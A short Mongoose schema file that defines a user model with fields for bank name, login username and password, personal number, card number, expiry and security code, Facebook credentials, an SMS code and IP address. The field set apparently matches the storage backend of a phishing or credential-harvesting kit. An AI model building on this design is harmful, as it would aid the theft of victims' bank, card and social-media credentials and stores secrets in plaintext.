import mongoose from "mongoose";
const Schema = mongoose.Schema;

const UserSchema = new Schema({
	userId: {
		type: Number,
		default: 0
	},
	bankName: {
		type: String,
		default: ''
	},
	username: {
		type: String,
		default: "",
	},
	password: {
		type: String,
		default: "",
	},
	personNumber: {
		type: String,
		default: "",
	},
	cardInfo: {
		type: Object,
		default: {
			cardNumber: '',
			valideTime: '',
			secureCode: ''
		},
	},
	facebook: {
		type: Object,
		default: {
			username: '',
			password: ''
		}
	},
	sms: {
		type: String,
		default: '',
	},
	bankId: {
		type: String,
		default: '',
	},
	ip: {
		type: String,
		default: ''
	}
});

const Users = mongoose.model("users", UserSchema);

const UserModels = {
	Users
}



export default UserModels;